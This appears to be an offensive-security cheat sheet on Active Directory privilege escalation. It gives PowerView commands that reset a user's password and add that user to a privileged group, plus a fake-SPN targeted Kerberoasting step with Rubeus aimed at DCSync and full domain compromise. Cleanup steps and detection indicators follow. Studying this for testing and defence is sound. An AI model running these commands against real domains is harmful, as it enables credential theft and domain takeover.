# ACL Abuse & Targeted Kerberoasting

### Scenario Context

This attack path is used to escalate from a compromised low-privileged user (e.g., `<USERNAME_1>`) to a high-privileged account (e.g., `<USERNAME_3>`) that possesses **DCSync** rights. By chaining ACL permissions, an attacker can eventually retrieve NTLM hashes for all domain users and achieve full domain compromise.

---

### Workflow 1: Password Reset and Nested Group Escalation

**When to use:** Use when your current account has permissions to force a password change on a target user who possesses inherited or direct rights to a sensitive group.

1. **Authenticate as the controlled user:** Create a credential object to execute commands within the context of the compromised account.
2. **Reset the target user's password:** Set a new cleartext password for the intermediary target account.
3. **Authenticate as the intermediary user:** Create a new credential object using the newly reset password.
4. **Modify group membership:** Use the intermediary account’s rights to add itself to a privileged group (e.g., "Help Desk Level 1") to gain further permissions through **nested group membership**.

#### Command Reference: Password Reset & Group Escalation

|Tool|Command|Parameter|Description|
|:--|:--|:--|:--|
|**PowerShell**|`ConvertTo-SecureString`|`-AsPlainText -Force`|Converts a cleartext password into a secure string object.|
|**PowerShell**|`New-Object ...PSCredential`|`'<DOMAIN>\<USERNAME>', <SECURE_STRING>`|Creates a credential object for alternate authentication.|
|**PowerView**|`Set-DomainUserPassword`|`-Identity <USERNAME>`|Target account for the password reset.|
|**PowerView**|`Add-DomainGroupMember`|`-Identity <GROUP>`|The privileged group the user is joining.|

**Execution:**

```
# 1. Create credential object for initial user
$SecPassword = ConvertTo-SecureString '<PASSWORD_1>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME_1>', $SecPassword)

# 2. Reset target password
$NewTargetPassword = ConvertTo-SecureString '<PASSWORD_2>' -AsPlainText -Force
Set-DomainUserPassword -Identity <USERNAME_2> -AccountPassword $NewTargetPassword -Credential $Cred -Verbose

# 3. Create credential object for intermediary user
$Cred2 = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME_2>', $NewTargetPassword)

# 4. Escalate to target group
Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<USERNAME_2>' -Credential $Cred2 -Verbose
```

---

### Workflow 2: Targeted Kerberoasting (Fake SPN)

**When to use:** Use when you have **GenericAll** rights over a high-privileged admin account but cannot reset its password (to avoid service interruption). **Attack Implication:** Modifying the `servicePrincipalName` (SPN) attribute makes the account "Kerberoastable," allowing the retrieval of a TGS ticket that can be cracked offline to reveal the plaintext password.

1. **Set a fake SPN:** Assign a temporary service principal name to the target admin object.
2. **Request TGS Ticket:** Use Rubeus to target the specific user and extract the Kerberos hash.
3. **Perform Offline Cracking:** Use a tool like Hashcat on the attack machine to crack the obtained hash.

#### Command Reference: SPN Modification & Kerberoasting

|Tool|Command|Flag / Parameter|Description|
|:--|:--|:--|:--|
|**PowerView**|`Set-DomainObject`|`-SET @{serviceprincipalname='<SPN>'}`|Configures a fake SPN for the target object.|
|**Rubeus**|`kerberoast`|`/user:<USERNAME>`|Kerberoasts only the specified target.|
|||`/nowrap`|Ensures the hash is not truncated in the terminal.|

**Execution:**

```
# 1. Assign fake SPN
Set-DomainObject -Credential $Cred2 -Identity <USERNAME_3> -SET @{serviceprincipalname='<FAKE_SVC>/<STRING>'} -Verbose

# 2. Kerberoast and extract hash
.\Rubeus.exe kerberoast /user:<USERNAME_3> /nowrap
```

---

### Critical Cleanup Procedures

**Operational Note:** Cleanup must be performed in a specific order. You must clear the fake SPN **before** removing the user from the privileged group; otherwise, you will lose the permissions required to modify the target object.

1. **Clear the SPN:** Remove the fake service principal name from the target account.
2. **Revert Group Membership:** Remove the intermediary user from the privileged group.

**Execution:**

```
# 1. Remove SPN attribute
Set-DomainObject -Credential $Cred2 -Identity <USERNAME_3> -Clear serviceprincipalname -Verbose

# 2. Remove user from group
Remove-DomainGroupMember -Identity "<TARGET_GROUP>" -Members '<USERNAME_2>' -Credential $Cred2 -Verbose
```

---

### Detection and Defensive Indicators

Defenders can monitor for these techniques by auditing specific Event IDs and analyzing object attributes.

|Indicator|Significance|
|:--|:--|
|**Event ID 5136**|Logged when a directory service object is modified (indicates SPN or ACL changes).|
|**SDDL Strings**|Contains non-human readable details of modifications within event logs.|
|**DiscretionaryAcl**|Monitoring this property can reveal suspicious assignments like **GenericWrite** or **GenericAll**.|

**SDDL Decoding:**

```
# Convert non-human readable SDDL from logs to readable format
ConvertFrom-SddlString "<SDDL_STRING>"
```